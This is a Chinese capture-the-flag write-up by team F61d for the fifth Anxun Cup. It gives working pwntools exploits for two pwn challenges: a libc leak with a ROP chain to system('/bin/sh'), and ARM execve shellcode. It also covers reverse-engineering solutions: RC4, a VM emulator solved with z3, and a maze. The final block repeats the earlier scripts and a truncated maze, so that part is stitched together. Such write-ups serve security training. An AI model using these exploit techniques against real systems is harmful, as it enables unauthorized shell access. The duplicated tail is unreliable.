# 第五届安洵杯”网络安全挑战赛WriteUp By F61d

> 原文: https://www.ctfiot.com/81036.html
> ID: 81036

为积极响应国家网络空间安全人才战略，加快创新性人才培养步伐，提升学生攻防兼备的网络创新，培养并提升学生的团队合作精神与能力，提高学生的网络安全创新能力与实践技能。四川安洵信息技术有限公司携手成都信息工程大学道格安全研究实验室举办了面向全国高校的第五届”安洵杯”网络安全挑战赛

本次第五届”安杯”网络安全挑战赛，经过师傅们的不懈努力 (指被小姐姐带飞），F61d成功拿下第二名的好成绩???

比赛最后的排名情况

PWN

Babybf

逆向一下指令，利用越界读泄露libc，越界写修改栈返回地址

from pwn import *

#p = process('./chall')
p=remote('47.108.29.107',10356)
libc=ELF('./libc-2.27.so')
context.log_level = 'debug'

context.arch = 'amd64'
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)
def cmd(code):
    sla('len> ',str(len(code)))
    sa('code> ',code)

cmd(p8(0x3e)*0x58+(p8(0x2e)+p8(0x3e))*8+p8(0x2d)*8)
sleep(1)
libcbase=u64(p.recv(6).ljust(8,'x00'))-231-libc.sym['__libc_start_main']
info('libc->'+hex(libcbase))
system=libcbase+libc.sym['system']
binsh=libcbase+libc.search("/bin/sh").next()
poprdi=libcbase+libc.search(asm("pop rdinret")).next()

#gdb.attach(p,'b* $rebase(0x16FA)')
cmd(p8(0x3e)*0x38+(p8(0x2c)+p8(0x3e))*0x20)
p.send(p64(poprdi+1)+p64(poprdi)+p64(binsh)+p64(system))
p.interactive()

Babyarm

base64换表，然后往bss上写arm架构下的shellcode

from pwn import *

#p = process(["./qemu-arm-static","-L", "/usr/arm-linux-gnueabi/", "./chall"])
p=remote('47.108.29.107',10356)
# libc=ELF('./libc.so.6')
context.log_level = 'debug'
context.arch = 'arm'
elf=ELF('./chall')
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)

sla('msg> ','s1mpl3Dec0d4r')
payload='a'*0x28+p32(elf.bss()+0x3c)+p32(0x10c00)
sa('comment> ',payload.ljust(0x100,'x00'))
shellcode='''
    add r0,pc,#12
    mov r1,#0
    mov r2,#0
    mov r7,#11
    svc 0
    .ascii "/bin/sh\0"
'''
shellcode=asm(shellcode)

payload=shellcode.ljust(0x2c,'x00')+p32(elf.bss()+0x10)
p.sendline(payload)
p.interactive()

REVERSE

Reee

进入sub_401640函数

进入loc_4011B0发现有花

将e8patch掉

分析sub_401050，sub_401130函数发现是rc4加密

直接用工具解密可以得到flag
img

re1

仔细分析一下其实是一个虚拟机保护

循环中通过指针函数进行模拟指令的调用

直接模拟出汇编指令 然后z3求解即可

code=[ ...]

this=[0]*16
this[0] = 0
this[1] = 0
this[2] = 0
this[3] = "begin"
this[4] = 0xF1;
this[5] = "change_dest;"
this[6]= 0xF2;
this[7] = "xor;"
this[8] = 0xF5;
this[9] =" add;"
this[10] = 0xF6;
this[11] =" right_shift;"
this[12]= 0xF8;
this[13] = "unknow1;"
this[14]= 0xF9;
this[15] = "unknow2;"
Dest="xxxxxxxxxxxxabcdefghijkl"
ptr=0
print("===============================")
while(code[ptr]!=0xF4):
    opcode = code[ptr]
    if(opcode==0xF1):
        a1 = code[ptr+1]
        a2 = code[ptr+2]
        if(a1==0xE1):
            print("eax = dest[%d]"%a2)
        if(a1==0xE2):
            print("ebx = dest[%d]"%a2)
        if(a1==0xE3):
            print("ecx = dest[%d]"%a2)
        if(a1==0xE4):
            print("dest[%d] = eax"%a2)
        ptr+=6
    elif(opcode==0xF2):
        a2 = code[ptr+1]
        print("eax^=ebx")
        ptr+=1
    elif(opcode==0xf5):
        a2 = code[ptr+1]
        print("read input")
        ptr+=1
    elif(opcode==0xf6):
        a2 = code[ptr+1]
        print("eax =  ((2<<eax)|(eax>>6))&0xff ")
        ptr+=1
    elif(opcode==0xf8):
        a1 = code[ptr+1]
        a2 = code[ptr+2]
        if(a1==0xe1):
            print("eax+=%d"%a2)
            print("eax&=0xff")
        if(a1==0xe2):
            print("ebx+=%d"%a2)
            print("ebx&=0xff")
        if(a1==0xe3):
            print("ecx+=a2")
        ptr+=3
    elif(opcode==0xf9):
        a1 = code[ptr+1]
        a2 = code[ptr+2]
        if(a1==0xe1):
            print("eax-=%d"%a2)
            print("eax&=0xff")
        if(a1==0xe2):
            print("ebx-=%d"%a2)
            print("ebx&=0xff")
        if(a1==0xe3):
            print("ecx-=%d"%a2)
        ptr+=3

打印后z3求解

from z3 import *
data=[0xA7, 0x3A, 0x19, 0xB4, 0xF1, 0x49, 0x2B, 0xCB, 0xEA, 0x0E, 
  0x0E, 0x14]

dest=[0]*76
for i in range(12):
    dest[32+i] = BitVec("x[%d]"%(i+1),8)

eax = dest[32]
ebx = dest[33]
ebx+=164
ebx&=0xff
eax^=ebx
eax-=5
eax&=0xff
dest[64] = eax
eax = dest[33]
ebx = dest[34]
ebx+=112
ebx&=0xff
eax^=ebx
eax-=151
eax&=0xff
dest[65] = eax
eax = dest[34]
ebx = dest[35]
ebx+=79
ebx&=0xff
eax^=ebx
eax-=121
eax&=0xff
dest[66] = eax
eax = dest[35]
ebx = dest[36]
ebx+=211
ebx&=0xff
eax^=ebx
eax-=71
eax&=0xff
dest[67] = eax
eax = dest[36]
ebx = dest[37]
ebx+=95
ebx&=0xff
eax^=ebx
eax-=146
eax&=0xff
dest[68] = eax
eax = dest[37]
ebx = dest[38]
ebx+=3
ebx&=0xff
eax^=ebx
eax-=74
eax&=0xff
dest[69] = eax
eax = dest[38]
ebx = dest[39]
ebx+=8
ebx&=0xff
eax^=ebx
eax-=189
eax&=0xff
dest[70] = eax
eax = dest[39]
ebx = dest[40]
ebx+=40
ebx&=0xff
eax^=ebx
eax-=57
eax&=0xff
dest[71] = eax
eax = dest[40]
ebx = dest[41]
ebx+=127
ebx&=0xff
eax^=ebx
eax-=41
eax&=0xff
dest[72] = eax
eax = dest[41]
ebx = dest[42]
ebx+=41
ebx&=0xff
eax^=ebx
eax-=59
eax&=0xff
dest[73] = eax
eax = dest[42]
ebx = dest[43]
ebx+=55
ebx&=0xff
eax^=ebx
eax-=193
eax&=0xff
dest[74] = eax
eax = dest[43]
ebx = dest[64]
ebx+=186
ebx&=0xff
eax^=ebx
eax-=209
eax&=0xff
dest[75] = eax
S = Solver()
for i in range(12):
    S.add(dest[64+i]==data[i])
S.check()
print(S.model())
x=[0]*13
x[5] = 232
x[4] = 64
x[1] = 172
x[9] = 64
x[11] = 116
x[12] = 132
x[8] = 108
x[2] = 92
x[7] = 156
x[10] = 212
x[6] = 12
x[3] = 29
for i in range(13):
    tmp = x[i]
    tmp = ((tmp<<6)|(tmp>>2)) &0xff
    tmp ^= (ord("a")+i-1)
    print(chr(tmp),end='')
#  Ju$t_e@sy_vM

re2

Main函数中是一个改了输入的rc4加密，发现是一个虚假的flag

在函数sub_402A80中发现off_40665C跟进sub_402780

进入StartAddress并进入fn发现loc_4027F0

进入发现有花指令

将3fpatch掉f5

找出迷宫图纸。

0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 0 1 1 0 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 1 1 1 0 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 1 1 1 1 1 0 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 1 1 1 0 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 1 1 1 1 1 0 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 1 1 1 0 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 1 0 1 0 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 0 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 0 0 0 1 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 0 0 0 0 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 0 0 0 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 0 0 1 1 1 0 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 0 0 0 0 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 1 1 0 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 0 1 1 1 0 1 1 1 1 0 0 0 0 0 0 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 0 1 0 1 0 1 1 1 1 1 1 1 1 0 0 0 0 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 0 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 0 1 1 1 1 0 0 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 0 1 0 1 1 1 1 0 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 1 1 1 1 0 1 1 1 0 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 1 1 1 1 0 1 1 1 0 0 0  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 0 1 0 1 0 0  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 2

发现是类似于走迷宫。

上下左右走结果不对

找所有调用dword_4068A0的函数

发现其他地方改过

一个是将初始的位置放在（2，2），另一个是将上下左右改成斜线。

同时查看迷宫图纸的所有调用：

有两处改动：

将迷宫图纸改正：

0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 0 1 1 0 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 1 1 1 0 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 1 1 1 1 1 0 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 1 1 1 0 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 1 1 1 1 1 0 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 1 1 1 0 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 1 0 1 0 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 0 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 0 0 0 1 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 0 0 0 0 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 0 0 0 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 0 0 1 1 1 0 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 0 0 0 0 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 1 1 0 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 0 1 1 1 0 1 1 1 1 0 0 0 0 0 0 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 0 1 0 1 0 1 1 1 1 1 1 1 1 0 0 0 0 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 0 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 0 1 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 0 1 1 1 1 0 0 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 0 1 0 1 1 1 1 0 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 1 1 1 1 0 1 1 1 0 1  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 1 1 1 1 0 1 1 1 0 0 0  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 0 1 0 1 0 0  
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 2 1 0 1 1 1 1

手工跑图，并且需要走75步

得到结果：dssaaasasssdsddddwddssasaaassdsssaasssddssasaassaaassdsdsssaaassddddsdssasa

WEB

Babyphp

参考链接：https://www.cnblogs.com/20175211lyz/p/11515519.html


```
from pwn import *

    #p = process('./chall')
p=remote('47.108.29.107',10356)
libc=ELF('./libc-2.27.so')
context.log_level = 'debug'

context.arch = 'amd64'
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)
def cmd(code):
    sla('len> ',str(len(code)))
    sa('code> ',code)

cmd(p8(0x3e)*0x58+(p8(0x2e)+p8(0x3e))*8+p8(0x2d)*8)
sleep(1)
libcbase=u64(p.recv(6).ljust(8,'x00'))-231-libc.sym['__libc_start_main']
info('libc->'+hex(libcbase))
system=libcbase+libc.sym['system']
binsh=libcbase+libc.search("/bin/sh").next()
poprdi=libcbase+libc.search(asm("pop rdinret")).next()

    #gdb.attach(p,'b* $rebase(0x16FA)')
cmd(p8(0x3e)*0x38+(p8(0x2c)+p8(0x3e))*0x20)
p.send(p64(poprdi+1)+p64(poprdi)+p64(binsh)+p64(system))
p.interactive()
from pwn import *

    #p = process(["./qemu-arm-static","-L", "/usr/arm-linux-gnueabi/", "./chall"])
p=remote('47.108.29.107',10356)
# libc=ELF('./libc.so.6')
context.log_level = 'debug'
context.arch = 'arm'
elf=ELF('./chall')
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)

sla('msg> ','s1mpl3Dec0d4r')
payload='a'*0x28+p32(elf.bss()+0x3c)+p32(0x10c00)
sa('comment> ',payload.ljust(0x100,'x00'))
shellcode='''
    add r0,pc,#12
    mov r1,#0
    mov r2,#0
    mov r7,#11
    svc 0
    .ascii "/bin/sh\0"
'''
shellcode=asm(shellcode)

payload=shellcode.ljust(0x2c,'x00')+p32(elf.bss()+0x10)
p.sendline(payload)
p.interactive()
code=[ ...]

this=[0]*16
this[0] = 0
this[1] = 0
this[2] = 0
this[3] = "begin"
this[4] = 0xF1;
this[5] = "change_dest;"
this[6]= 0xF2;
this[7] = "xor;"
this[8] = 0xF5;
this[9] =" add;"
this[10] = 0xF6;
this[11] =" right_shift;"
this[12]= 0xF8;
this[13] = "unknow1;"
this[14]= 0xF9;
this[15] = "unknow2;"
Dest="xxxxxxxxxxxxabcdefghijkl"
ptr=0
print("===============================")
while(code[ptr]!=0xF4):
    opcode = code[ptr]
    if(opcode==0xF1):
        a1 = code[ptr+1]
        a2 = code[ptr+2]
        if(a1==0xE1):
            print("eax = dest[%d]"%a2)
        if(a1==0xE2):
            print("ebx = dest[%d]"%a2)
        if(a1==0xE3):
            print("ecx = dest[%d]"%a2)
        if(a1==0xE4):
            print("dest[%d] = eax"%a2)
        ptr+=6
    elif(opcode==0xF2):
        a2 = code[ptr+1]
        print("eax^=ebx")
        ptr+=1
    elif(opcode==0xf5):
        a2 = code[ptr+1]
        print("read input")
        ptr+=1
    elif(opcode==0xf6):
        a2 = code[ptr+1]
        print("eax =  ((2<<eax)|(eax>>6))&0xff ")
        ptr+=1
    elif(opcode==0xf8):
        a1 = code[ptr+1]
        a2 = code[ptr+2]
        if(a1==0xe1):
            print("eax+=%d"%a2)
            print("eax&=0xff")
        if(a1==0xe2):
            print("ebx+=%d"%a2)
            print("ebx&=0xff")
        if(a1==0xe3):
            print("ecx+=a2")
        ptr+=3
    elif(opcode==0xf9):
        a1 = code[ptr+1]
        a2 = code[ptr+2]
        if(a1==0xe1):
            print("eax-=%d"%a2)
            print("eax&=0xff")
        if(a1==0xe2):
            print("ebx-=%d"%a2)
            print("ebx&=0xff")
        if(a1==0xe3):
            print("ecx-=%d"%a2)
        ptr+=3
from z3 import *
data=[0xA7, 0x3A, 0x19, 0xB4, 0xF1, 0x49, 0x2B, 0xCB, 0xEA, 0x0E, 
  0x0E, 0x14]

dest=[0]*76
for i in range(12):
    dest[32+i] = BitVec("x[%d]"%(i+1),8)

eax = dest[32]
ebx = dest[33]
ebx+=164
ebx&=0xff
eax^=ebx
eax-=5
eax&=0xff
dest[64] = eax
eax = dest[33]
ebx = dest[34]
ebx+=112
ebx&=0xff
eax^=ebx
eax-=151
eax&=0xff
dest[65] = eax
eax = dest[34]
ebx = dest[35]
ebx+=79
ebx&=0xff
eax^=ebx
eax-=121
eax&=0xff
dest[66] = eax
eax = dest[35]
ebx = dest[36]
ebx+=211
ebx&=0xff
eax^=ebx
eax-=71
eax&=0xff
dest[67] = eax
eax = dest[36]
ebx = dest[37]
ebx+=95
ebx&=0xff
eax^=ebx
eax-=146
eax&=0xff
dest[68] = eax
eax = dest[37]
ebx = dest[38]
ebx+=3
ebx&=0xff
eax^=ebx
eax-=74
eax&=0xff
dest[69] = eax
eax = dest[38]
ebx = dest[39]
ebx+=8
ebx&=0xff
eax^=ebx
eax-=189
eax&=0xff
dest[70] = eax
eax = dest[39]
ebx = dest[40]
ebx+=40
ebx&=0xff
eax^=ebx
eax-=57
eax&=0xff
dest[71] = eax
eax = dest[40]
ebx = dest[41]
ebx+=127
ebx&=0xff
eax^=ebx
eax-=41
eax&=0xff
dest[72] = eax
eax = dest[41]
ebx = dest[42]
ebx+=41
ebx&=0xff
eax^=ebx
eax-=59
eax&=0xff
dest[73] = eax
eax = dest[42]
ebx = dest[43]
ebx+=55
ebx&=0xff
eax^=ebx
eax-=193
eax&=0xff
dest[74] = eax
eax = dest[43]
ebx = dest[64]
ebx+=186
ebx&=0xff
eax^=ebx
eax-=209
eax&=0xff
dest[75] = eax
S = Solver()
for i in range(12):
    S.add(dest[64+i]==data[i])
S.check()
print(S.model())
x=[0]*13
x[5] = 232
x[4] = 64
x[1] = 172
x[9] = 64
x[11] = 116
x[12] = 132
x[8] = 108
x[2] = 92
x[7] = 156
x[10] = 212
x[6] = 12
x[3] = 29
for i in range(13):
    tmp = x[i]
    tmp = ((tmp<<6)|(tmp>>2)) &0xff
    tmp ^= (ord("a")+i-1)
    print(chr(tmp),end='')
#  Ju$t_e@sy_vM
0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 0 1 1 0 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 1 1 1 0 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 1 1 1 1 1 0 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 1 1 1 0 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 1 1 1 1 1 0 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 1 1 1 0 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 0 1 0 1 0 1 0 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 0 1 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 1 1 0 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 0 0 0 1 1 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
